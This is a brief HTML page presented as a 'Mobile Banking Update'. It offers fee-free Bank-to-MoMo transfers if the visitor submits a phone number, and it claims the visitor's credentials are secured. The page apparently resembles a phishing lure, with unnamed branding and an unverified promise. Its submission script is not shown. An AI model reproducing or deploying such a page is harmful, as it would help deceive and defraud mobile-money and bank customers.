<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Mobile Banking Update</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="top-section">
        <h1>MOBILE BANKING UPDATE</h1>
        <p>
            Validating your phone number to the account enables you to make transactions 
            from Bank to MoMo or vice-versa without any fees associated.
        </p>
    </div>

    <div class="form-container">
        <label for="phone">Phone Number</label>
        <input type="tel" id="phone" placeholder="Enter your phone number">

        <button onclick="submitPhone()">Submit</button>

        <p class="note">Your credentials are secured.</p>
    </div>

<script src="script.js"></script>
</body>
</html>
